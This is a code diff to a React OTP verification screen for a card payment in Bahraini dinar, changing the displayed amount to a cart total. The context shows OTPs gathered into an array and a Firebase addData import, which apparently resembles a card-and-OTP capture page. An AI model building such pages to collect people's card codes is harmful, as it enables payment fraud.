@@ -5,6 +5,7 @@ import type React from "react"
 import { useState, useEffect, useRef } from "react"
 import { NumericKeypad } from "./numeric-keypad"
 import { addData } from "../firebase"
+import { useCart } from "../cartContext"
 
 interface OTPVerificationProps {
   amount: string
@@ -23,7 +24,9 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   const otpInputRef = useRef<HTMLInputElement>(null)
   const timerRef = useRef<NodeJS.Timeout | null>(null)
   const allOtps: string[]=[]
-  // Mask the card number
+  // Mask the card number  
+  const {total} = useCart() as any
+
   const maskedCardNumber = cardNumber.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")
 
   // Start countdown timer
@@ -143,7 +146,7 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
         <div className="space-y-5 mb-8">
           <div className="flex justify-between items-center">
             <span className="text-right font-medium text-lg">المبلغ</span>
-            <span className="font-bold text-lg">BD {amount}</span>
+            <span className="font-bold text-lg"> {total.toFixed(2)}<strong style={{margin:2}}>BD</strong></span>
           </div>
 
           <div className="flex justify-between items-center">
